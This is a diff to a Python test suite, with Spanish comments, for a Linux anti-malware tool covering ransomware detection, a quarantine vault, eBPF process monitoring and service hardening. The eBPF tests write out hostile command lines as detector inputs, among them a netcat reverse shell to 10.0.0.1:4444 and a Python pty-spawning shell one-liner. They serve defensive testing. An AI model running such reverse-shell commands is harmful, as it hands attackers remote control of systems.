@@ -251,17 +251,31 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertIn("CanaryTrapTriggered", alert_triggered[0][0])
 
     def test_ransomware_extension_burst_detection(self):
-        """Verifica que el escudo reconozca extensiones hostiles de cifrado masivo."""
-        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"))
+        """Verifica que el escudo distinga lectura de escritura en extensiones y no mate en lecturas."""
+        killed_processes = []
+        def mock_alert(reason, pid):
+            killed_processes.append((reason, pid))
+
+        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=mock_alert)
         malicious_names = [
             "/home/user/document.docx.locked",
             "/home/user/backup.sql.crypto",
             "/home/user/photo.jpg.lockbit",
             "/home/user/database.db.enc"
         ]
+
+        # 1. LECTURA de archivo con extensión sospechosa -> PERMITIDO (no es amenaza ni ejecuta SIGKILL)
         for name in malicious_names:
-            is_ransom = shield.check_file_path(name, pid=99999)
-            self.assertTrue(is_ransom, f"No detectó extensión de ransomware: {name}")
+            is_threat = shield.check_file_path(name, pid=77777, is_write=False, is_read=True)
+            self.assertFalse(is_threat, f"Falso positivo en lectura de archivo cifrado legítimo: {name}")
+
+        # 2. ESCRITURA sospechosa aislada -> Bloqueo preventivo (FAN_DENY) pero sin matar el proceso (terminate_process=False)
+        dec = shield.evaluate_operation("/home/user/single_doc.locked", pid=88888, is_write=True, is_read=False)
+        self.assertTrue(dec.is_blocked)
+        self.assertFalse(dec.terminate_process, "Una extensión sospechosa aislada NUNCA debe provocar SIGKILL.")
+
+        is_blocked = shield.check_file_path("/home/user/single_doc.locked", pid=88888, is_write=True, is_read=False)
+        self.assertTrue(is_blocked)
 
         safe_names = [
             "/home/user/report.pdf",
@@ -269,8 +283,33 @@ class TestConstantineSecurity(unittest.TestCase):
             "/home/user/archive.tar.gz"
         ]
         for name in safe_names:
-            is_ransom = shield.check_file_path(name, pid=99999)
-            self.assertFalse(is_ransom, f"Falso positivo en: {name}")
+            is_ransom = shield.check_file_path(name, pid=99999, is_write=True, is_read=False)
+            self.assertFalse(is_ransom, f"Falso positivo en archivo seguro: {name}")
+
+    def test_ransomware_read_only_canary_allowed(self):
+        """Verifica que abrir un canary honeypot en solo lectura (O_RDONLY) no dispare alerta ni mate el proceso."""
+        alerts = []
+        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=lambda r, p: alerts.append((r, p)))
+        canary_path = list(shield.canary_files.keys())[0]
+
+        # Lectura pura (is_read=True, is_write=False, is_delete_or_rename=False)
+        is_threat = shield.check_file_path(canary_path, pid=55555, is_write=False, is_read=True)
+        self.assertFalse(is_threat)
+        self.assertEqual(len(alerts), 0)
+
+    def test_ransomware_read_burst_does_not_trigger_sigkill(self):
+        """Verifica que recorrer cientos de archivos en lectura (como find/grep/tar) no dispare el umbral de ráfagas."""
+        alerts = []
+        shield = RansomwareShield(canary_dir=os.path.join(self.tmp, "canaries"), alert_callback=lambda r, p: alerts.append((r, p)))
+
+        # Simular 100 operaciones de lectura pura en menos de 2 segundos (típico de tar o grep)
+        for i in range(100):
+            fake_path = f"/home/user/document_{i}.txt"
+            is_threat = shield.check_file_path(fake_path, pid=44444, is_write=False, is_read=True)
+            self.assertFalse(is_threat)
+
+        self.assertEqual(len(alerts), 0)
+        self.assertEqual(len(shield.process_write_counts.get(44444, [])), 0)
 
     # =========================================================================
     # 4. PRUEBAS DE LISTA BLANCA Y RESISTENCIA A EVASIONES
@@ -398,6 +437,53 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertFalse(restored, "Fallo criptográfico: Carga con Auth Tag corrupto fue aceptada.")
         self.assertFalse(os.path.exists(fpath))
 
+    def test_vault_streaming_chunked_large_file_and_key_recovery(self):
+        """Verifica cifrado por bloques de 64 KB en streaming y exportación de recuperación de claves."""
+        # Archivo de múltiples bloques (>150 KB para abarcar varios chunks de 64 KB)
+        large_fpath = os.path.join(self.tmp, "large_sample.bin")
+        large_payload = b"A" * (64 * 1024) + b"B" * (64 * 1024) + b"C" * (10 * 1024)
+        with open(large_fpath, "wb") as f:
+            f.write(large_payload)
+
+        vid = self.vault.quarantine_file(large_fpath, "Malware.LargeStream")
+        self.assertIsNotNone(vid)
+        self.assertFalse(os.path.exists(large_fpath))
+
+        # Comprobar formato streaming en disco (cabecera CST_AES256GCM_S:)
+        quar_file = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
+        os.chmod(quar_file, 0o600)
+        with open(quar_file, "rb") as f:
+            header = f.read(16)
+        os.chmod(quar_file, 0o000)
+        self.assertEqual(header, b"CST_AES256GCM_S:")
+
+        # Restauración en streaming y validación de coincidencia exacta byte a byte
+        restored = self.vault.restore_file(vid, destination_path=large_fpath)
+        self.assertTrue(restored)
+        self.assertTrue(os.path.exists(large_fpath))
+        with open(large_fpath, "rb") as f:
+            restored_bytes = f.read()
+        self.assertEqual(restored_bytes, large_payload)
+
+        # Probar exportación e importación de paquete de recuperación de clave
+        recovery_pkg = os.path.join(self.tmp, "key_recovery.json")
+        self.assertTrue(self.vault.export_key_recovery_package(recovery_pkg))
+        self.assertTrue(os.path.exists(recovery_pkg))
+
+        # Probar que un archivo de clave corrupto NO se sobrescribe silenciosamente
+        corrupt_key_file = os.path.join(self.tmp, "corrupt_key.key")
+        with open(corrupt_key_file, "wb") as kf:
+            kf.write(b"short_corrupt_data")
+        # Debe lanzar excepción y rehusar inicializarse con datos corruptos
+        with self.assertRaises(ValueError):
+            QuarantineVault(storage_dir=self.tmp, key_file=corrupt_key_file)
+
+    def test_scanner_update_signatures_syncs_feeds_real(self):
+        """Verifica que update_signatures invoque sync_feeds y refleje resultados reales."""
+        res = self.scanner.update_signatures(sync_remote=False)
+        self.assertIn("yara_reloaded", res)
+        self.assertIn("feed_sync", res)
+
     # =========================================================================
     # 6. PRUEBAS DE EBPF Y CENTINELA DE RESCATE
     # =========================================================================
@@ -406,11 +492,20 @@ class TestConstantineSecurity(unittest.TestCase):
         status_info = monitor.get_status_info()
         self.assertIn("status", status_info)
         self.assertIn("recommendation", status_info)
+        self.assertIn("operational_label", status_info)
+        self.assertIn("monitored_vectors", status_info)
 
         # Iniciar monitor
         monitor.start()
         # Debe ser operativo (ya sea mediante kernel BCC o centinela de rescate /proc)
         self.assertTrue(monitor.is_operational())
+        info = monitor.get_status_info()
+        # Debe reflejar claramente si está en modo degradado o nativo
+        if monitor.is_degraded():
+            self.assertEqual(info["mode"], "DEGRADED_USERSPACE_POLLER")
+            self.assertEqual(info["operational_label"], "MODO DEGRADADO (ESPACIO DE USUARIO)")
+        elif monitor.is_active():
+            self.assertIn(info["mode"], ("EBPF_KERNEL_PROBES", "BPF_LSM_ENFORCING"))
         monitor.stop()
 
     def test_ebpf_kill_offender(self):
@@ -418,6 +513,37 @@ class TestConstantineSecurity(unittest.TestCase):
         # Test safe boundary check: PID 1 or <= 0 never killed
         self.assertFalse(monitor.kill_offender(0, "Test", "safe_check"))
         self.assertFalse(monitor.kill_offender(1, "Test", "safe_check"))
+
+    def test_ebpf_netcat_benign_vs_hostile_discrimination(self):
+        """Verifica que Netcat legítimo (ej. -zv, -l) no sea clasificado como amenaza y solo se bloqueen reverse shells."""
+        monitor = EBPFMonitor()
+
+        # 1. Uso legítimo de administración de redes (BENIGNO)
+        is_threat, _ = monitor.evaluate_execution_threat("nc", "/usr/bin/nc", "nc -zv 192.168.1.1 80")
+        self.assertFalse(is_threat, "Falso positivo: escaneo legítimo de puertos con nc no debe ser bloqueado")
+
+        is_threat, _ = monitor.evaluate_execution_threat("netcat", "/usr/bin/netcat", "netcat -l -p 8080")
+        self.assertFalse(is_threat, "Falso positivo: netcat listener en puerto local no debe ser bloqueado")
+
+        # 2. Uso malicioso de Netcat con banderas de ejecución de shell (HOSTIL)
+        is_threat, threat = monitor.evaluate_execution_threat("nc", "/usr/bin/nc", "nc 10.0.0.1 4444 -e /bin/bash")
+        self.assertTrue(is_threat)
+        self.assertEqual(threat, "Exploit.ReverseShell.Netcat")
+
+        # 3. Binario Netcat dropeado en /tmp
+        is_threat, threat = monitor.evaluate_execution_threat("nc", "/tmp/nc", "/tmp/nc 1.2.3.4 9999")
+        self.assertTrue(is_threat)
+        self.assertIn("UntrustedDirExecution", threat)
+
+    def test_ebpf_multi_argument_reverse_shell_detection(self):
+        """Verifica que argumentos situados más allá de argv[1] sean analizados correctamente."""
+        monitor = EBPFMonitor()
+
+        # Shell reversa Python donde los argumentos críticos están al final
+        args_deep = 'python3 -u -O -c "import socket,os,pty; s=socket.socket(); pty.spawn(\'/bin/sh\')"'
+        is_threat, threat = monitor.evaluate_execution_threat("python3", "/usr/bin/python3", args_deep)
+        self.assertTrue(is_threat)
+        self.assertEqual(threat, "Exploit.ReverseShell.PythonPty")
     def test_ebpf_event_lifecycle_states(self):
         """Verifica que EBPFMonitor maneje los estados explícitos de ciclo de vida sin confundir alerta con bloqueo."""
         monitor = EBPFMonitor(auto_kill=False)
@@ -493,10 +619,10 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertIn("current_kernel", info)
 
     def test_auto_updater(self):
-        cu = ConstantineUpdater(current_version="4.0.0")
-        self.assertEqual(cu._parse_version("4.0.0"), (4, 0, 0))
-        self.assertEqual(cu._parse_version("v4.1.0"), (4, 1, 0))
-        self.assertTrue(cu._parse_version("4.1.0") > cu._parse_version("4.0.0"))
+        cu = ConstantineUpdater(current_version="4.0.9")
+        self.assertEqual(cu._parse_version("4.0.9"), (4, 0, 9))
+        self.assertEqual(cu._parse_version("v4.1.1"), (4, 1, 1))
+        self.assertTrue(cu._parse_version("4.1.1") > cu._parse_version("4.0.9"))
 
     def test_usb_sentinel_containment_and_scan(self):
         """Verifica que el monitor USB aplique contención fanotify y aísle autoruns hostiles."""
@@ -728,17 +854,30 @@ class TestConstantineSecurity(unittest.TestCase):
 
     def test_network_quarantine_isolation(self):
         """Verifica que NetworkQuarantine contenga procesos agresores y corte sockets."""
-        nq = NetworkQuarantine()
-        # Proceso 1 o 0 nunca debe ser aislado
-        self.assertFalse(nq.isolate_pid(0, terminate=False))
-        self.assertFalse(nq.isolate_pid(1, terminate=False))
+        import tempfile
+        fake_cgroup = tempfile.mkdtemp()
+        try:
+            nq = NetworkQuarantine(cgroup_path=fake_cgroup)
+            # Proceso 1 o 0 nunca debe ser aislado
+            self.assertFalse(nq.isolate_pid(0, terminate=False))
+            self.assertFalse(nq.isolate_pid(1, terminate=False))
 
-        # Aislamiento de PID sospechoso
-        self.assertTrue(nq.isolate_pid(99999, terminate=False))
-        self.assertIn(99999, nq.quarantined_pids)
-        nq.unbind_pid(99999)
-        self.assertNotIn(99999, nq.quarantined_pids)
-        nq.cleanup()
+            # Aislamiento de PID sospechoso (incluso si fuese UID 0)
+            self.assertTrue(nq.isolate_pid(99999, terminate=False))
+            self.assertIn(99999, nq.quarantined_pids)
+            
+            # Verificación del estado del cortafuegos
+            state = nq.verify_firewall_state()
+            self.assertIsInstance(state, dict)
+            self.assertIn("quarantined_pids", state)
+            self.assertIn(99999, state["quarantined_pids"])
+
+            nq.unbind_pid(99999)
+            self.assertNotIn(99999, nq.quarantined_pids)
+            nq.cleanup()
+        finally:
+            if os.path.exists(fake_cgroup):
+                shutil.rmtree(fake_cgroup, ignore_errors=True)
 
     def test_threat_intel_exact_counts_no_fake_numbers(self):
         """Verifica que los conteos de firmas reflejen las filas reales sin números inflados."""
@@ -837,6 +976,24 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertEqual(len(history), 1)
         self.assertEqual(history[0]["feed_name"], "MalwareBazaar")
         self.assertEqual(history[0]["status"], "SUCCESS")
+
+    def test_systemd_service_isolation_and_hardening(self):
+        """Verifica que el servicio systemd implemente NoNewPrivileges, ProtectSystem=strict y capacidades delimitadas."""
+        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
+        self.assertTrue(os.path.exists(service_file))
+
+        with open(service_file, "r") as f:
+            content = f.read()
+
+        # Directivas obligatorias de hardening
+        self.assertIn("NoNewPrivileges=true", content)
+        self.assertIn("ProtectSystem=strict", content)
+        self.assertIn("ProtectKernelTunables=true", content)
+        self.assertIn("ProtectKernelModules=true", content)
+        self.assertIn("PrivateTmp=true", content)
+        self.assertIn("CapabilityBoundingSet=", content)
+        self.assertIn("CAP_SYS_ADMIN", content)
+        self.assertIn("ReadWritePaths=", content)
 
 
 if __name__ == "__main__":
